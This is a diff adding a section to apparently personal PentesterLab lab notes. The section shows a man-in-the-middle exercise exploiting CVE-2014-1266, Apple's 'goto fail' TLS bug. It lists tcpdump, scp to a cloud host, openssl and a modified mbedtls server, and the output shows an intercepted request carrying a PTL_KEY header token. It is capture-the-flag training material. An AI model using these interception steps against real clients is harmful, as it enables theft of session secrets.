@@ -157,3 +157,25 @@ Connection: Close
 
 ### CVE-2014-1266
 
+[goto fail;](https://opensource.apple.com/source/Security/Security-55471/libsecurity_ssl/lib/sslKeyExchange.c?txt) also bypasses public key pinning
+
+```
+$ sudo tcpdump -i eth0 udp port 53 # the victim is trying to access pentesterlab.com so we download and send the cert to our vps
+$ scp -i ~/u5.pem pentesterlab.com ubuntu@ec2-18-191-42-249.us-east-2.compute.amazonaws.com:/home/ubuntu/ptlab/intercept/cve-2014-1266
+$ openssl s_client -connect pentesterlab.com:443 -showcerts > pentesterlab.pem # also change mbedtls as shown in the course intructions
+$ sudo ./mbedtls-2.2.1/programs/ssl/ssl_server 
+
+  . Loading the server cert. and key... ok
+  . Bind on https://localhost:443/ ... ok
+  . Seeding the random number generator... ok
+  . Setting up the SSL data.... ok
+  . Waiting for a remote connection ... ok
+  . Performing the SSL/TLS handshake... ok
+  < Read from client: 108 bytes read
+
+GET / HTTP/1.1
+Host: pentesterlab.com
+PTL_KEY: e530e0a6-65f6-42a4-9147-a4386ee133e1
+Connection: Close
+```
+
